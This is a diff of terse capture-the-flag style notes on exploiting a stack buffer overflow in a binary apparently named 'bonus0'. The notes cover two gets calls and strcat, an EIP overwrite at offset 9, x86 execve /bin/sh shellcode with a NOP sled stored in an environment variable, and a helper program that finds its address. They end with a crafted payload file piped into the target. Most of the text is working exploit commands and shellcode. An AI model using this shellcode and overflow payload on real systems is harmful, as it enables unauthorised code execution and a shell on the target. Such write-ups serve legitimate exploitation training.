@@ -1,3 +1,12 @@
+program does two calls to gets
+then strcat the two arguments
+if we try to overflow we see that in the second argument at offset 9 we can change eip
+we need to write a file greater than the buffer that is 4096 long
+so we write 4095 "a" then a "\n" so we can enter overflow using a file
+we use a shellcode to spawn a shell
+we need to store our shellcode somwhere we try the env
+export CODE=`python -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
+we then write a program to get at wih address our shellcode is
 getenv.c
 #include <unistd.h>
 
@@ -13,7 +22,7 @@ int main(void)
 
 }
 
-export CODE=`python -c 'print("\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
 ./a.out
 >bffffeae
 python -c 'print("a"*4095 +"\n" + "B"*9 + "\xbf\xff\xfe\xae"[::-1] +"C"*20)' > /tmp/test
+cat /tmp/test - | .bonus0
